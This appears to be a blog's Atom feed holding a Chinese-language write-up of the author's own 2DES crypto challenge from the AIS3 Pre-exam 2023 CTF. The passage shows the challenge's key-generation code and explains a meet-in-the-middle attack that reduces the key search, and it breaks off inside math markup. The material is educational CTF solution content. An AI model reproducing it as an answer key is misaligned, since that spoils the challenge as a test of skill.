<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ching367436</title>
  
  
  <link href="https://ching367436.github.io/atom.xml" rel="self"/>
  
  <link href="https://ching367436.github.io/"/>
  <updated>2023-06-06T07:44:47.000Z</updated>
  <id>https://ching367436.github.io/</id>
  
  <author>
    <name>王博靚</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>AIS3 Pre-exam 2023 Write-up</title>
    <link href="https://ching367436.github.io/ais3-pre-exam-2023-write-up/"/>
    <id>https://ching367436.github.io/ais3-pre-exam-2023-write-up/</id>
    <published>2023-06-06T07:44:47.000Z</published>
    <updated>2023-06-06T07:44:47.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="我出的題目"><a href="#我出的題目" class="headerlink" title="我出的題目"></a>我出的題目</h2><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="2DES"><a href="#2DES" class="headerlink" title="2DES"></a>2DES</h4><p><a class="link" href="https://github.com/Ching367436/My-CTF-Challenges/tree/main/ais3-pre-exam/2023/crypto/2des/src">題目連結 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><ul><li>解題人數<ul><li>MyFirstCTF: 1 / 111 (score &gt;= 100)</li><li>Pre-exam: 21 / 256 (score &gt;= 100)</li></ul></li></ul><p>這題考的 Meet-in-the-Middle attack，相信直接搜尋 <code>2DES</code> 就可以知道解題方向。為了怕題目太無聊，所以還加入了需要知道 DES 的一些性質的考點（不知道這個還是解的了）。</p><h5 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h5><p>首先題目會隨機生成 <code>key1</code> <code>key2</code>，其中每個 byte 的前 4 個 bits 都被固定成 <code>1</code>。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Generate key and IV</span></span><br><span class="line"><span class="keyword">const</span> key1 = crypto.<span class="title function_">randomBytes</span>(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">const</span> key2 = crypto.<span class="title function_">randomBytes</span>(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">const</span> iv = <span class="title class_">Buffer</span>.<span class="title function_">concat</span>([<span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">'AIS3 三'</span>)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) {</span><br><span class="line">    key1[i] = key1[i] | <span class="number">0b11110000</span></span><br><span class="line">    key2[i] = key2[i] | <span class="number">0b11110000</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><p>接著會把用 <code>key1</code> <code>key2</code> 加密兩層後的 <code>FLAG</code> 以及 <code>hint_pt</code> 印出來，要透過 <code>res</code> <code>hint_pt</code> <code>hint</code> <code>iv</code> 想辦法解出 <code>FLAG</code>。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">res = <span class="title function_">encrypt</span>(<span class="title function_">encrypt</span>(<span class="variable constant_">FLAG</span>, key1, iv), key2, iv)</span><br><span class="line">hint = <span class="title function_">encrypt</span>(<span class="title function_">encrypt</span>(hint_pt, key1, iv), key2, iv)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`let res = '<span class="subst">${res.toString(<span class="string">'hex'</span>)}</span>'`</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`let hint_pt = '<span class="subst">${hint_pt.toString(<span class="string">'hex'</span>)}</span>'`</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`let hint = '<span class="subst">${hint.toString(<span class="string">'hex'</span>)}</span>'`</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`let iv = '<span class="subst">${iv.toString(<span class="string">'hex'</span>)}</span>'`</span>)</span><br></pre></td></tr></table></figure></div><h5 id="題解"><a href="#題解" class="headerlink" title="題解"></a>題解</h5><p>只要取得 <code>key1</code> <code>key2</code> 就可直接解出 <code>FLAG</code>，直接列舉 <code>key1</code> <code>key2</code> 的話會有 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="14.539ex" height="2.09ex" role="img" focusable="false" viewBox="0 -841.7 6426.3 923.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(1512.3,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="msup" transform="translate(2512.6,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(4080.4,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(5136.2,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container> 種可能，所以是不可行的。</p><h6 id="Meet-in-the-Middle"><a href="#Meet-in-the-Middle" class="headerlink" title="Meet-in-the-Middle"></a>Meet-in-the-Middle</h6><p>這邊可以利用 meet-in-the-middle attack 幫我們把時間複雜度開個根號，具體如下。</p><p>首先要先知道 <code>encrypt(hint_pt, key1, iv)</code> 與 <code>decrypt(hint, key2, iv)</code> 會是相等的 –（1）。</p><img src="/ais3-pre-exam-2023-write-up/meet-in-the-middle.svg" style="width: 100%;"><p>利用這個特性，我們先列舉出所有可能的 <code>middle=encrypt(hint_pt, key1, iv)</code>（透過列舉 <code>key1</code> 來達成），需花費 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.919ex" height="1.887ex" role="img" focusable="false" viewBox="0 -833.9 1290.1 833.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container> 的時間。</p><p>接著來列舉 <code>decrypt(hint, key2, iv)</code>，由於（1），所以當 <code>key2</code> 是正確的時候，一定可以在 middle 裡面找到  <code>decrypt(hint, key2, iv)</code>，所以那個 middle 所對應到的 <code>key1</code> <code>key2</code> 就很可能是正確的，這步驟最多需列舉 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.919ex" height="1.887ex" role="img" focusable="false" viewBox="0 -833.9 1290.1 833.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container> 個 <code>key2</code>，每次找尋 <code>middle</code> 若使用的是 Javascript 的 map 或 Python 的 dict 所花的時間在一般情況下會是 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="4.692ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2074 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="4F" d="M308 428Q289 428 289 438Q289 457 318 508T378 593Q417 638 475 671T599 705Q688 705 732 643T777 483Q777 380 733 285T620 123T464 18T293 -22Q188 -22 123 51T58 245Q58 327 87 403T159 533T249 626T333 685T388 705Q404 705 404 693Q404 674 363 649Q333 632 304 606T239 537T181 429T158 290Q158 179 214 114T364 48Q489 48 583 165T677 438Q677 473 670 505T648 568T601 617T528 636Q518 636 513 635Q486 629 460 600T419 544T392 490Q383 470 372 459Q341 430 308 428Z"></path></g></g><g data-mml-node="mo" transform="translate(796,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(1185,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(1685,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>，所以此步驟需花費 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.919ex" height="1.887ex" role="img" focusable="false" viewBox="0 -833.9 1290.1 833.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container> 的時間。</p><p>所以所需花的時間從原本的 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="14.539ex" height="2.09ex" role="img" focusable="false" viewBox="0 -841.7 6426.3 923.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(1512.3,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="msup" transform="translate(2512.6,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(4080.4,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(5136.2,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container> 變成了 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="14.539ex" height="2.072ex" role="img" focusable="false" viewBox="0 -833.9 6426.3 915.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 